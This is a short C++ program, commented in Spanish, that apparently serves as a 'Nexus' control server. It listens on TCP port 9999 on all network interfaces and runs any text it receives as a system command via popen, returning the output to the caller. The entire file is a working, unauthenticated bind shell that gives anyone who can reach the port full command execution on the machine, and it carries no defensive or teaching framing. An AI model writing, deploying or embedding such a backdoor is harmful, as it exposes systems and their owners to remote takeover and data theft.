#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>
#include <array>
#include <memory>

// Función para ejecutar comandos del sistema y capturar la salida
std::string executeCommand(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) return "Error al ejecutar comando.";
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[1024] = {0};

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(9999); // Puerto de control Nexus

    bind(server_fd, (struct sockaddr *)&address, sizeof(address));
    listen(server_fd, 3);

    std::cout << "[NEXUS] Sistema en escucha en puerto 9999..." << std::endl;

    while(true) {
        new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
        memset(buffer, 0, 1024);
        read(new_socket, buffer, 1024);
        
        std::cout << "Ejecutando: " << buffer << std::endl;
        std::string output = executeCommand(buffer);
        
        send(new_socket, output.c_str(), output.length(), 0);
        close(new_socket);
    }
    return 0;
}
